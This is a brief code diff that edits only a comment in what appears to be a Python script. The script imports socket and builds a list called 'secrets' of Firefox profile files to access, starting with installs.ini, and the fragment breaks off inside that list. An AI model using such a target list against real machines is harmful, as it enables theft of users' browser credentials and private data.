@@ -3,7 +3,7 @@ import socket
 import os
 import re
 
-## Please manage the order by yourself, earlier one has more possibilities to be accessed !
+## Please manage the order by yourself, earlier one has more possibilities to be accessed!
 secrets = [
 # Something important in Firefox ...
 '/AppData/Roaming/Mozilla/Firefox/installs.ini',   # with the default 
